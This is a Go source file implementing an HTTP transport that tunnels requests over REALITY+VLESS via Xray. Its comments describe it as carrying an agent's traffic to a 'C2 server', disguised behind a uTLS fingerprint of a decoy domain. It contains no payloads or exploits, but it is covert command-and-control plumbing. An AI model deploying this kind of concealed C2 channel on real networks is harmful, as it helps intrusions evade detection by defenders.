package reality

import (
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"sync"
	"time"
)

// TransportConfig holds the parameters needed to establish a REALITY+VLESS
// tunnel and bridge it into Go's HTTP transport layer.
type TransportConfig struct {
	// VPS is the address of the Xray REALITY server (for example, "203.0.113.10:443").
	VPS string

	// Reality holds the REALITY handshake credentials.
	Reality *Config

	// VLESS credentials
	UUID     []byte // 16-byte VLESS client UUID
	DestIP   string // VLESS destination IP (typically "127.0.0.1")
	DestPort uint16 // VLESS destination port (typically 5000)
}

// vlessConn wraps a REALITY UConn and lazily strips the VLESS response header
// on the first Read. Xray buffers the VLESS response header until it has
// downlink data. If we tried to read it in DialContext, the HTTP request that
// produces the downlink has not been sent yet, which would deadlock. The wrapper
// consumes the 2-byte header (version + addons length) plus any addon bytes
// on the first Read call, which happens after the HTTP request is written.
type vlessConn struct {
	net.Conn
	once    sync.Once
	initErr error
}

// Read consumes the VLESS response header on the first call, then passes
// through to the underlying connection for all subsequent reads.
func (v *vlessConn) Read(b []byte) (int, error) {
	v.once.Do(func() {
		// VLESS response: [version(1)] [addons_len(1)] [addons(N)]
		hdr := make([]byte, 2)
		if _, err := io.ReadFull(v.Conn, hdr); err != nil {
			v.initErr = fmt.Errorf("vless response header: %w", err)
			return
		}
		if hdr[0] != 0 {
			v.initErr = fmt.Errorf("vless response version: got %d, want 0", hdr[0])
			return
		}
		if hdr[1] > 0 {
			addons := make([]byte, hdr[1])
			if _, err := io.ReadFull(v.Conn, addons); err != nil {
				v.initErr = fmt.Errorf("vless response addons: %w", err)
				return
			}
		}
	})
	if v.initErr != nil {
		return 0, v.initErr
	}
	return v.Conn.Read(b)
}

// NewHTTPTransport creates a stdlib http.Transport whose DialContext establishes
// a REALITY+VLESS tunnel to the C2 server. Every HTTP request the agent makes
// through this transport is tunnelled through a uTLS ClientHello preset for the
// configured decoy domain.
//
// Connection pooling works naturally: http.Transport caches connections by host,
// and HTTP/1.1 keep-alive operates over the VLESS stream (VLESS adds no framing
// after the initial request/response headers).
func NewHTTPTransport(cfg *TransportConfig) *http.Transport {
	return &http.Transport{
		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			tcpConn, err := (&net.Dialer{}).DialContext(ctx, "tcp", cfg.VPS)
			if err != nil {
				return nil, fmt.Errorf("reality transport: tcp dial %s: %w", cfg.VPS, err)
			}

			uConn, err := Dial(tcpConn, cfg.Reality, ctx)
			if err != nil {
				tcpConn.Close()
				return nil, fmt.Errorf("reality transport: handshake: %w", err)
			}

			frame, err := VLESSRequest(cfg.UUID, cfg.DestIP, cfg.DestPort)
			if err != nil {
				uConn.Close()
				return nil, fmt.Errorf("reality transport: vless frame: %w", err)
			}
			if _, err := uConn.Write(frame); err != nil {
				uConn.Close()
				return nil, fmt.Errorf("reality transport: vless write: %w", err)
			}

			// The first Read consumes Xray's response header after the request is sent.
			return &vlessConn{Conn: uConn}, nil
		},

		// A small pool avoids reconnecting during bursts of concurrent tasks.
		MaxIdleConns:        4,
		MaxIdleConnsPerHost: 2,
		IdleConnTimeout:     90 * time.Second,
	}
}
